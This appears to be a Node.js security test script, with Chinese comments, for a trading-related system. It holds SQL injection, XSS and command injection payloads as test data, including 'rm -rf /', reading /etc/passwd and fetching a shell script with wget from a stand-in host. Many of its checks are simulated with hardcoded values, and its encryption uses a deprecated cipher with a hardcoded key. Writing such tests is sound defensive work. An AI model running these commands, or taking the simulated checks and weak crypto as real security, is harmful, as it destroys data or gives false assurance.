#!/usr/bin/env node

/**
 * 市场状态识别与自适应系统安全测试
 * 测试系统的安全性和数据保护
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

console.log('🔒 开始安全测试...\n');

const securityResults = {
    categories: [],
    summary: {
        totalCategories: 0,
        passedCategories: 0,
        failedCategories: 0,
        totalTests: 0,
        passedTests: 0,
        failedTests: 0,
        criticalIssues: 0,
        highRiskIssues: 0,
        mediumRiskIssues: 0,
        lowRiskIssues: 0
    }
};

function logSecurityTest(categoryName, testName, passed, riskLevel = 'LOW', error = null) {
    let category = securityResults.categories.find(c => c.name === categoryName);
    if (!category) {
        category = { name: categoryName, tests: [], passed: 0, failed: 0, highestRisk: 'LOW' };
        securityResults.categories.push(category);
        securityResults.summary.totalCategories++;
    }
    
    category.tests.push({ name: testName, passed, riskLevel, error });
    securityResults.summary.totalTests++;
    
    if (passed) {
        console.log(`  ✅ ${testName}`);
        category.passed++;
        securityResults.summary.passedTests++;
    } else {
        const riskIcon = {
            'CRITICAL': '🚨',
            'HIGH': '⚠️',
            'MEDIUM': '⚡',
            'LOW': '💡'
        }[riskLevel] || '💡';
        
        console.log(`  ${riskIcon} ${testName}: ${error} [${riskLevel}]`);
        category.failed++;
        securityResults.summary.failedTests++;
        
        // 更新风险统计
        securityResults.summary[`${riskLevel.toLowerCase()}RiskIssues`]++;
        
        // 更新类别最高风险级别
        const riskLevels = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'];
        if (riskLevels.indexOf(riskLevel) > riskLevels.indexOf(category.highestRisk)) {
            category.highestRisk = riskLevel;
        }
    }
}

function finalizeCategory(categoryName) {
    const category = securityResults.categories.find(c => c.name === categoryName);
    if (category) {
        const categorySuccess = category.failed === 0;
        if (categorySuccess) {
            securityResults.summary.passedCategories++;
            console.log(`✅ ${categoryName} 安全测试通过 (${category.passed}/${category.passed + category.failed})\n`);
        } else {
            securityResults.summary.failedCategories++;
            console.log(`❌ ${categoryName} 安全测试失败 (${category.passed}/${category.passed + category.failed}) [最高风险: ${category.highestRisk}]\n`);
        }
    }
}

// 1. 输入验证和数据清理测试
console.log('🛡️ 输入验证和数据清理测试');

function testInputValidationAndSanitization() {
    const categoryName = '输入验证和数据清理';
    
    try {
        // 1. SQL注入防护测试
        const sqlInjectionPayloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "' UNION SELECT * FROM sensitive_data --"
        ];
        
        let sqlInjectionBlocked = true;
        for (const payload of sqlInjectionPayloads) {
            const sanitized = sanitizeInput(payload);
            if (sanitized.includes('DROP') || sanitized.includes('UNION') || sanitized.includes('--')) {
                sqlInjectionBlocked = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, 'SQL注入防护', sqlInjectionBlocked, 'CRITICAL', 
            sqlInjectionBlocked ? null : 'SQL注入载荷未被正确过滤');
        
        // 2. XSS防护测试
        const xssPayloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert(String.fromCharCode(88,83,83))//'"
        ];
        
        let xssBlocked = true;
        for (const payload of xssPayloads) {
            const sanitized = sanitizeInput(payload);
            if (sanitized.includes('<script>') || sanitized.includes('javascript:') || sanitized.includes('onerror=')) {
                xssBlocked = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, 'XSS攻击防护', xssBlocked, 'HIGH', 
            xssBlocked ? null : 'XSS载荷未被正确过滤');
        
        // 3. 命令注入防护测试
        const commandInjectionPayloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/shell.sh",
            "`whoami`"
        ];
        
        let commandInjectionBlocked = true;
        for (const payload of commandInjectionPayloads) {
            const sanitized = sanitizeInput(payload);
            if (sanitized.includes(';') || sanitized.includes('|') || sanitized.includes('&&') || sanitized.includes('`')) {
                commandInjectionBlocked = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, '命令注入防护', commandInjectionBlocked, 'CRITICAL', 
            commandInjectionBlocked ? null : '命令注入载荷未被正确过滤');
        
        // 4. 数据类型验证
        const invalidInputs = [
            { input: 'abc', expectedType: 'number', field: 'leverage' },
            { input: -1, expectedType: 'positive_number', field: 'confidence' },
            { input: '', expectedType: 'non_empty_string', field: 'strategy_id' },
            { input: null, expectedType: 'object', field: 'market_data' }
        ];
        
        let dataTypeValidationPassed = true;
        for (const test of invalidInputs) {
            const isValid = validateDataType(test.input, test.expectedType);
            if (isValid) {
                dataTypeValidationPassed = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, '数据类型验证', dataTypeValidationPassed, 'MEDIUM', 
            dataTypeValidationPassed ? null : '无效数据类型未被正确拒绝');
        
        // 5. 输入长度限制
        const longInput = 'A'.repeat(10000);
        const lengthValidationResult = validateInputLength(longInput, 1000);
        
        logSecurityTest(categoryName, '输入长度限制', !lengthValidationResult.valid, 'MEDIUM', 
            lengthValidationResult.valid ? '超长输入未被拒绝' : null);
        
    } catch (error) {
        logSecurityTest(categoryName, '输入验证框架', false, 'HIGH', error.message);
    }
    
    finalizeCategory(categoryName);
}

// 2. 认证和授权测试
console.log('🔐 认证和授权测试');

function testAuthenticationAndAuthorization() {
    const categoryName = '认证和授权';
    
    try {
        // 1. API密钥验证
        const validApiKey = generateMockApiKey();
        const invalidApiKeys = [
            '',
            'invalid_key',
            'expired_key_' + Date.now(),
            null,
            undefined
        ];
        
        let apiKeyValidationPassed = true;
        for (const key of invalidApiKeys) {
            const isValid = validateApiKey(key);
            if (isValid) {
                apiKeyValidationPassed = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, 'API密钥验证', apiKeyValidationPassed, 'HIGH', 
            apiKeyValidationPassed ? null : '无效API密钥被接受');
        
        // 2. 会话管理
        const sessionTest = testSessionManagement();
        logSecurityTest(categoryName, '会话管理安全', sessionTest.secure, 'HIGH', 
            sessionTest.secure ? null : sessionTest.issue);
        
        // 3. 权限控制
        const permissionTests = [
            { user: 'readonly_user', action: 'UPDATE_CONFIG', shouldAllow: false },
            { user: 'admin_user', action: 'UPDATE_CONFIG', shouldAllow: true },
            { user: 'guest_user', action: 'VIEW_DATA', shouldAllow: true },
            { user: 'guest_user', action: 'DELETE_DATA', shouldAllow: false }
        ];
        
        let permissionControlPassed = true;
        for (const test of permissionTests) {
            const hasPermission = checkPermission(test.user, test.action);
            if (hasPermission !== test.shouldAllow) {
                permissionControlPassed = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, '权限控制', permissionControlPassed, 'HIGH', 
            permissionControlPassed ? null : '权限控制存在漏洞');
        
        // 4. 令牌安全性
        const tokenSecurityTest = testTokenSecurity();
        logSecurityTest(categoryName, '令牌安全性', tokenSecurityTest.secure, 'MEDIUM', 
            tokenSecurityTest.secure ? null : tokenSecurityTest.issue);
        
    } catch (error) {
        logSecurityTest(categoryName, '认证授权框架', false, 'CRITICAL', error.message);
    }
    
    finalizeCategory(categoryName);
}

// 3. 数据保护和加密测试
console.log('🔒 数据保护和加密测试');

function testDataProtectionAndEncryption() {
    const categoryName = '数据保护和加密';
    
    try {
        // 1. 敏感数据加密
        const sensitiveData = {
            apiKey: 'sk-1234567890abcdef',
            privateKey: '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...',
            password: 'user_password_123'
        };
        
        let encryptionPassed = true;
        for (const [key, value] of Object.entries(sensitiveData)) {
            const encrypted = encryptSensitiveData(value);
            if (encrypted === value || encrypted.includes(value)) {
                encryptionPassed = false;
                break;
            }
        }
        
        logSecurityTest(categoryName, '敏感数据加密', encryptionPassed, 'CRITICAL', 
            encryptionPassed ? null : '敏感数据未正确加密');
        
        // 2. 传输加密
        const transmissionTest = testTransmissionEncryption();
        logSecurityTest(categoryName, '传输层加密', transmissionTest.encrypted, 'HIGH', 
            transmissionTest.encrypted ? null : transmissionTest.issue);
        
        // 3. 存储加密
        const storageTest = testStorageEncryption();
        logSecurityTest(categoryName, '存储加密', storageTest.encrypted, 'HIGH', 
            storageTest.encrypted ? null : storageTest.issue);
        
        // 4. 密钥管理
        const keyManagementTest = testKeyManagement();
        logSecurityTest(categoryName, '密钥管理', keyManagementTest.secure, 'CRITICAL', 
            keyManagementTest.secure ? null : keyManagementTest.issue);
        
        // 5. 数据脱敏
        const maskedData = maskSensitiveData('1234567890123456'); // 信用卡号
        const maskingPassed = maskedData !== '1234567890123456' && maskedData.includes('****');
        
        logSecurityTest(categoryName, '数据脱敏', maskingPassed, 'MEDIUM', 
            maskingPassed ? null : '敏感数据未正确脱敏');
        
    } catch (error) {
        logSecurityTest(categoryName, '数据保护框架', false, 'CRITICAL', error.message);
    }
    
    finalizeCategory(categoryName);
}

// 4. 网络安全测试
console.log('🌐 网络安全测试');

function testNetworkSecurity() {
    const categoryName = '网络安全';
    
    try {
        // 1. HTTPS强制使用
        const httpsTest = testHttpsEnforcement();
        logSecurityTest(categoryName, 'HTTPS强制使用', httpsTest.enforced, 'HIGH', 
            httpsTest.enforced ? null : 'HTTP连接未被重定向到HTTPS');
        
        // 2. CORS配置
        const corsTest = testCorsConfiguration();
        logSecurityTest(categoryName, 'CORS配置安全', corsTest.secure, 'MEDIUM', 
            corsTest.secure ? null : corsTest.issue);
        
        // 3. 请求频率限制
        const rateLimitTest = testRateLimit();
        logSecurityTest(categoryName, '请求频率限制', rateLimitTest.limited, 'MEDIUM', 
            rateLimitTest.limited ? null : '请求频率未被限制');
        
        // 4. DDoS防护
        const ddosTest = testDdosProtection();
        logSecurityTest(categoryName, 'DDoS防护', ddosTest.protected, 'HIGH', 
            ddosTest.protected ? null : ddosTest.issue);
        
        // 5. 安全头设置
        const securityHeadersTest = testSecurityHeaders();
        logSecurityTest(categoryName, '安全HTTP头', securityHeadersTest.secure, 'MEDIUM', 
            securityHeadersTest.secure ? null : securityHeadersTest.missingHeaders.join(', ') + ' 头缺失');
        
    } catch (error) {
        logSecurityTest(categoryName, '网络安全框架', false, 'HIGH', error.message);
    }
    
    finalizeCategory(categoryName);
}

// 5. 日志和监控安全测试
console.log('📊 日志和监控安全测试');

function testLoggingAndMonitoringSecurity() {
    const categoryName = '日志和监控安全';
    
    try {
        // 1. 敏感信息日志泄露
        const logTest = testSensitiveDataInLogs();
        logSecurityTest(categoryName, '敏感信息日志保护', !logTest.containsSensitiveData, 'HIGH', 
            logTest.containsSensitiveData ? '日志中发现敏感信息' : null);
        
        // 2. 日志完整性
        const logIntegrityTest = testLogIntegrity();
        logSecurityTest(categoryName, '日志完整性保护', logIntegrityTest.protected, 'MEDIUM', 
            logIntegrityTest.protected ? null : '日志可能被篡改');
        
        // 3. 审计跟踪
        const auditTest = testAuditTrail();
        logSecurityTest(categoryName, '审计跟踪完整性', auditTest.complete, 'MEDIUM', 
            auditTest.complete ? null : '审计跟踪不完整');
        
        // 4. 监控告警
        const alertTest = testSecurityAlerts();
        logSecurityTest(categoryName, '安全监控告警', alertTest.functioning, 'HIGH', 
            alertTest.functioning ? null : '安全告警系统异常');
        
    } catch (error) {
        logSecurityTest(categoryName, '日志监控框架', false, 'MEDIUM', error.message);
    }
    
    finalizeCategory(categoryName);
}

// 6. 配置安全测试
console.log('⚙️ 配置安全测试');

function testConfigurationSecurity() {
    const categoryName = '配置安全';
    
    try {
        // 1. 默认密码检查
        const defaultPasswordTest = testDefaultPasswords();
        logSecurityTest(categoryName, '默认密码检查', !defaultPasswordTest.hasDefaultPasswords, 'CRITICAL', 
            defaultPasswordTest.hasDefaultPasswords ? '发现默认密码' : null);
        
        // 2. 配置文件权限
        const configPermissionTest = testConfigFilePermissions();
        logSecurityTest(categoryName, '配置文件权限', configPermissionTest.secure, 'HIGH', 
            configPermissionTest.secure ? null : '配置文件权限过于宽松');
        
        // 3. 环境变量安全
        const envVarTest = testEnvironmentVariableSecurity();
        logSecurityTest(categoryName, '环境变量安全', envVarTest.secure, 'MEDIUM', 
            envVarTest.secure ? null : envVarTest.issue);
        
        // 4. 调试模式检查
        const debugModeTest = testDebugModeDisabled();
        logSecurityTest(categoryName, '调试模式禁用', debugModeTest.disabled, 'MEDIUM', 
            debugModeTest.disabled ? null : '生产环境启用了调试模式');
        
    } catch (error) {
        logSecurityTest(categoryName, '配置安全框架', false, 'HIGH', error.message);
    }
    
    finalizeCategory(categoryName);
}

// 辅助函数实现
function sanitizeInput(input) {
    if (typeof input !== 'string') return input;
    
    return input
        .replace(/[<>]/g, '') // 移除HTML标签
        .replace(/['";]/g, '') // 移除SQL注入字符
        .replace(/[|&;`]/g, '') // 移除命令注入字符
        .replace(/javascript:/gi, '') // 移除JavaScript协议
        .trim();
}

function validateDataType(input, expectedType) {
    switch (expectedType) {
        case 'number':
            return typeof input === 'number' && !isNaN(input);
        case 'positive_number':
            return typeof input === 'number' && input > 0;
        case 'non_empty_string':
            return typeof input === 'string' && input.length > 0;
        case 'object':
            return input !== null && typeof input === 'object';
        default:
            return false;
    }
}

function validateInputLength(input, maxLength) {
    return {
        valid: input.length <= maxLength,
        actualLength: input.length,
        maxLength
    };
}

function generateMockApiKey() {
    return 'sk_' + crypto.randomBytes(32).toString('hex');
}

function validateApiKey(apiKey) {
    if (!apiKey || typeof apiKey !== 'string') return false;
    if (apiKey.length < 10) return false;
    if (apiKey === 'invalid_key') return false;
    if (apiKey.startsWith('expired_key_')) return false;
    return true;
}

function testSessionManagement() {
    // 模拟会话管理测试
    const sessionId = crypto.randomBytes(16).toString('hex');
    const sessionTimeout = 30 * 60 * 1000; // 30分钟
    
    return {
        secure: sessionId.length >= 32 && sessionTimeout <= 60 * 60 * 1000,
        issue: sessionId.length < 32 ? '会话ID长度不足' : 
               sessionTimeout > 60 * 60 * 1000 ? '会话超时时间过长' : null
    };
}

function checkPermission(user, action) {
    const permissions = {
        'readonly_user': ['VIEW_DATA'],
        'admin_user': ['VIEW_DATA', 'UPDATE_CONFIG', 'DELETE_DATA'],
        'guest_user': ['VIEW_DATA']
    };
    
    return permissions[user]?.includes(action) || false;
}

function testTokenSecurity() {
    const token = crypto.randomBytes(32).toString('hex');
    const hasExpiration = true;
    const isHttpOnly = true;
    
    return {
        secure: token.length >= 64 && hasExpiration && isHttpOnly,
        issue: token.length < 64 ? '令牌长度不足' : 
               !hasExpiration ? '令牌无过期时间' : 
               !isHttpOnly ? '令牌非HttpOnly' : null
    };
}

function encryptSensitiveData(data) {
    // 模拟加密
    const cipher = crypto.createCipher('aes192', 'secret_key');
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

function testTransmissionEncryption() {
    // 模拟传输加密检查
    const useHttps = true;
    const tlsVersion = '1.3';
    
    return {
        encrypted: useHttps && tlsVersion >= '1.2',
        issue: !useHttps ? '未使用HTTPS' : 
               tlsVersion < '1.2' ? 'TLS版本过低' : null
    };
}

function testStorageEncryption() {
    // 模拟存储加密检查
    const encryptionEnabled = true;
    const encryptionAlgorithm = 'AES-256';
    
    return {
        encrypted: encryptionEnabled && encryptionAlgorithm.includes('256'),
        issue: !encryptionEnabled ? '存储未加密' : 
               !encryptionAlgorithm.includes('256') ? '加密强度不足' : null
    };
}

function testKeyManagement() {
    // 模拟密钥管理检查
    const keyRotation = true;
    const keyStorage = 'secure_vault';
    const keyAccess = 'restricted';
    
    return {
        secure: keyRotation && keyStorage === 'secure_vault' && keyAccess === 'restricted',
        issue: !keyRotation ? '密钥未定期轮换' : 
               keyStorage !== 'secure_vault' ? '密钥存储不安全' : 
               keyAccess !== 'restricted' ? '密钥访问权限过宽' : null
    };
}

function maskSensitiveData(data) {
    if (data.length <= 4) return '****';
    return '****' + data.slice(-4);
}

function testHttpsEnforcement() {
    // 模拟HTTPS强制检查
    const httpsRedirect = true;
    const hstsEnabled = true;
    
    return {
        enforced: httpsRedirect && hstsEnabled,
        issue: !httpsRedirect ? 'HTTP未重定向' : 
               !hstsEnabled ? 'HSTS未启用' : null
    };
}

function testCorsConfiguration() {
    // 模拟CORS配置检查
    const allowedOrigins = ['https://trusted-domain.com'];
    const allowsWildcard = false;
    
    return {
        secure: allowedOrigins.length > 0 && !allowsWildcard,
        issue: allowedOrigins.length === 0 ? 'CORS配置缺失' : 
               allowsWildcard ? 'CORS允许通配符' : null
    };
}

function testRateLimit() {
    // 模拟请求频率限制检查
    const rateLimitEnabled = true;
    const maxRequestsPerMinute = 100;
    
    return {
        limited: rateLimitEnabled && maxRequestsPerMinute <= 1000,
        issue: !rateLimitEnabled ? '未启用频率限制' : 
               maxRequestsPerMinute > 1000 ? '频率限制过宽松' : null
    };
}

function testDdosProtection() {
    // 模拟DDoS防护检查
    const ddosProtectionEnabled = true;
    const connectionLimit = 1000;
    
    return {
        protected: ddosProtectionEnabled && connectionLimit <= 5000,
        issue: !ddosProtectionEnabled ? 'DDoS防护未启用' : 
               connectionLimit > 5000 ? '连接限制过高' : null
    };
}

function testSecurityHeaders() {
    // 模拟安全头检查
    const requiredHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security'
    ];
    
    const presentHeaders = [
        'X-Content-Type-Options',
        'X-Frame-Options'
    ];
    
    const missingHeaders = requiredHeaders.filter(header => !presentHeaders.includes(header));
    
    return {
        secure: missingHeaders.length === 0,
        missingHeaders
    };
}

function testSensitiveDataInLogs() {
    // 模拟日志敏感信息检查
    const sampleLogs = [
        'User login successful for user: john_doe',
        'API key validation failed',
        'Processing payment for amount: $100.00'
    ];
    
    const sensitivePatterns = [
        /password/i,
        /api[_\s]?key/i,
        /credit[_\s]?card/i,
        /ssn/i
    ];
    
    let containsSensitiveData = false;
    for (const log of sampleLogs) {
        for (const pattern of sensitivePatterns) {
            if (pattern.test(log)) {
                containsSensitiveData = true;
                break;
            }
        }
        if (containsSensitiveData) break;
    }
    
    return { containsSensitiveData };
}

function testLogIntegrity() {
    // 模拟日志完整性检查
    const logSigning = true;
    const tamperDetection = true;
    
    return {
        protected: logSigning && tamperDetection,
        issue: !logSigning ? '日志未签名' : 
               !tamperDetection ? '缺少篡改检测' : null
    };
}

function testAuditTrail() {
    // 模拟审计跟踪检查
    const auditEvents = ['LOGIN', 'CONFIG_CHANGE', 'DATA_ACCESS', 'LOGOUT'];
    const recordedEvents = ['LOGIN', 'CONFIG_CHANGE', 'LOGOUT'];
    
    const missingEvents = auditEvents.filter(event => !recordedEvents.includes(event));
    
    return {
        complete: missingEvents.length === 0,
        missingEvents
    };
}

function testSecurityAlerts() {
    // 模拟安全告警检查
    const alertsConfigured = true;
    const alertsWorking = true;
    
    return {
        functioning: alertsConfigured && alertsWorking,
        issue: !alertsConfigured ? '告警未配置' : 
               !alertsWorking ? '告警系统故障' : null
    };
}

function testDefaultPasswords() {
    // 模拟默认密码检查
    const defaultPasswords = ['admin', 'password', '123456', 'default'];
    const currentPasswords = ['secure_password_123'];
    
    const hasDefaultPasswords = defaultPasswords.some(pwd => currentPasswords.includes(pwd));
    
    return { hasDefaultPasswords };
}

function testConfigFilePermissions() {
    // 模拟配置文件权限检查
    const filePermissions = '600'; // 只有所有者可读写
    const isSecure = filePermissions === '600' || filePermissions === '400';
    
    return {
        secure: isSecure,
        permissions: filePermissions
    };
}

function testEnvironmentVariableSecurity() {
    // 模拟环境变量安全检查
    const hasSecrets = true;
    const secretsInPlainText = false;
    
    return {
        secure: hasSecrets && !secretsInPlainText,
        issue: !hasSecrets ? '缺少必要的密钥配置' : 
               secretsInPlainText ? '密钥以明文存储' : null
    };
}

function testDebugModeDisabled() {
    // 模拟调试模式检查
    const debugMode = process.env.NODE_ENV !== 'production';
    
    return {
        disabled: !debugMode,
        currentMode: process.env.NODE_ENV || 'development'
    };
}

// 执行所有安全测试
async function runAllSecurityTests() {
    console.log('🚀 开始执行安全测试套件...\n');
    
    testInputValidationAndSanitization();
    testAuthenticationAndAuthorization();
    testDataProtectionAndEncryption();
    testNetworkSecurity();
    testLoggingAndMonitoringSecurity();
    testConfigurationSecurity();
    
    // 输出安全测试总结
    console.log('📊 安全测试总结:');
    console.log(`测试类别: ${securityResults.summary.totalCategories}`);
    console.log(`类别通过: ${securityResults.summary.passedCategories}`);
    console.log(`类别失败: ${securityResults.summary.failedCategories}`);
    console.log(`总测试数: ${securityResults.summary.totalTests}`);
    console.log(`测试通过: ${securityResults.summary.passedTests}`);
    console.log(`测试失败: ${securityResults.summary.failedTests}`);
    
    console.log('\n🚨 风险等级统计:');
    console.log(`严重风险: ${securityResults.summary.criticalRiskIssues}`);
    console.log(`高风险: ${securityResults.summary.highRiskIssues}`);
    console.log(`中风险: ${securityResults.summary.mediumRiskIssues}`);
    console.log(`低风险: ${securityResults.summary.lowRiskIssues}`);
    
    const categorySuccessRate = (securityResults.summary.passedCategories / securityResults.summary.totalCategories * 100).toFixed(1);
    const testSuccessRate = (securityResults.summary.passedTests / securityResults.summary.totalTests * 100).toFixed(1);
    
    console.log(`\n类别成功率: ${categorySuccessRate}%`);
    console.log(`测试成功率: ${testSuccessRate}%`);
    
    if (securityResults.summary.criticalRiskIssues > 0) {
        console.log('\n🚨 发现严重安全风险，必须立即修复！');
        securityResults.categories.forEach(category => {
            category.tests
                .filter(test => !test.passed && test.riskLevel === 'CRITICAL')
                .forEach(test => {
                    console.log(`- ${category.name}: ${test.name} - ${test.error}`);
                });
        });
    }
    
    if (securityResults.summary.highRiskIssues > 0) {
        console.log('\n⚠️ 发现高风险安全问题，建议优先修复：');
        securityResults.categories.forEach(category => {
            category.tests
                .filter(test => !test.passed && test.riskLevel === 'HIGH')
                .forEach(test => {
                    console.log(`- ${category.name}: ${test.name} - ${test.error}`);
                });
        });
    }
    
    // 保存安全测试报告
    const reportPath = path.join(__dirname, 'security-test-report.json');
    fs.writeFileSync(reportPath, JSON.stringify(securityResults, null, 2));
    console.log(`\n📄 安全测试报告已保存: ${reportPath}`);
    
    const overallSecure = securityResults.summary.criticalRiskIssues === 0 && 
                         securityResults.summary.highRiskIssues === 0;
    
    if (overallSecure) {
        console.log('\n🎉 安全测试通过！系统安全性符合要求。');
    } else {
        console.log('\n⚠️ 发现安全风险，建议修复后重新测试。');
    }
    
    return overallSecure;
}

// 运行安全测试
runAllSecurityTests().then(success => {
    process.exit(success ? 0 : 1);
}).catch(error => {
    console.error('安全测试执行失败:', error);
    process.exit(1);
});